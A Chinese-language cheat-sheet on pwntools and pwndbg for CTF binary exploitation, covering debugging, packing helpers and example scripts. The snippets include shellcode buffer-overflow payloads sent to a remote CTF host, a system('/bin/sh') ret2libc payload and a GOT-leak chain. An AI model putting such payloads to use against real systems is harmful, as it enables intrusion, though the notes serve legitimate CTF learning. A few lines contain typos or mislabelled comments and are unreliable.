pwndbg


## pwntools

[pwntools 命令行工具](https://zero-mk.github.io/2019/01/01/pwntools-Command%20Line%20Tools/)
[Link](https://www.jianshu.com/p/6e528b33e37a)
[Link](https://docs.pwntools.com/en/stable/timeout.html)

```py
# timeout
context.timeout = 30
```

### 本地启动

nc -vc ./fmt -kl 3333

然后其他机器就可以 nc ip port 连接了

### 怎样调试

方法 1

```python
context(arch='amd64', os='linux', log_level='debug')
sh = process('./pwn')
# gdb.attach(sh, 'b *0x1234')
gdb.attach(sh)
```

方法 2

```python
sh = process('./pwn')
raw_input('debug')
这时看pid，比如是 6533, 新建终端，
$gdb
$attach 6533
```

### 指令介绍

p32、p64 是 64/32 位代码 打包为二进制，u32、u64 是解包为二进制

**flat 模块能将 pattern 字符串和地址结合并且转为字节模式**

```python
payload = flat(cyclic(32), 0x804a060)
io.sendlijneafter(':', flat['a'*0x8c, e.plt['system'], 0, 0x804a024, 0, 0])
```

symbols

    ELF('./level3').symbols['main']
    ELF('./level3').sym['main']

gdb.attach(sh) # gdb 附加到调试

### 示例

```python
from pwn import *
context(log_level = 'debug', arch = 'i386', os = 'linux') # 能显示调试信息
#io = process('./level1')
io = remote('pwn2.jarvisoj.com', 9877) # 远程连接
text = io.recvline()[14: -2] # 获取返回值
# recvline(keepends=True) : 接收一行，keepends为是否保留行尾的\n
shellcode = asm(shellcraft.sh()) # pwntools生成的 sh 的shellcode
p64(0x400000) # 地址转 64 位二进制
p32(0x400000) # 地址转 32 位二进制
payload = shellcode.decode('latin') + '\x90' * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr).decode('latin')
io.send(payload)
io.interactive()
io.close()
```

从 write 返回 main

```python
#char[88] ebp  write函数地址  write函数返回地址(返回到main函数)  write函数参数一(1)  write函数参数二(write_got地址)  write函数参数三(写4字节)
payload = flat('A'*0x88, p32(0xdeadbeef), p32(write_plt), p32(main_addr), p32(1), p32(write_got), p32(0xdeadbeef))
# payload = flat('a'*0x88, p64(syscall), p64(syscall)) # buuctf这题需要2个，不明白。好像是栈没对齐的原因
```

#### 输入字符

```python
io.sendlineafter('name', payload)

io.recvuntil("your name")
io.sendline("/bin/sh")

print(io.recvall())
```

#### 汇编转二进制、数字、字符转换等

```python
# python3
from pwn import *
print(asm('XCHG EAX,ESP\nRET\nMOV ECX,[EAX]\nMOV [EDX],ECX\nPOP EBX\nRET'.lower()).hex())
```

p32 - Packs an 32-bit integer

```python
>>> p32(0x8040000)
b'\x00\x00\x04\x08'
```

u32 使用 - Unpacks an 64-bit integer

```python
>>> u32('\x00\x00\x04\x08')
134479872
>>> hex(u32('\x00\x00\x04\x08'))
'0x8040000'
```

#### runshellcode

```python
from pwn import *
run_shellcode(a.encode())
```

### 相关知识

通过 ldd 查找 libc 共享库， 这里 python 需要用到 c 语言的标准动态库, srand 用到 libc.so.6

```sh
kali@kali:/mnt/hgfs/vmware$ ldd guess_num
        linux-vdso.so.1 (0x00007ffec67fa000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007faeab4e3000)
        /lib64/ld-linux-x86-64.so.2 (0x00007faeab8c1000)
```

# FAQ

1. pwndbg Debugger always exiting
[Link](https://github.com/Gallopsled/pwntools/issues/1677) [Solution](https://github.com/Gallopsled/pwntools/commit/7ececc6bce24ccf3fe9c19c12b225e5e85d56afc)

# Article

[[分享] pwndbg+tmux真乃天作之合 ](https://bbs.kanxue.com/thread-276203.htm)
[baidu:IDA pwntools](https://www.baidu.com/s?wd=pwntools+ida+%E8%B0%83%E8%AF%95)
[IDA配合pwntool调试环境](https://zhuanlan.zhihu.com/p/347107006)
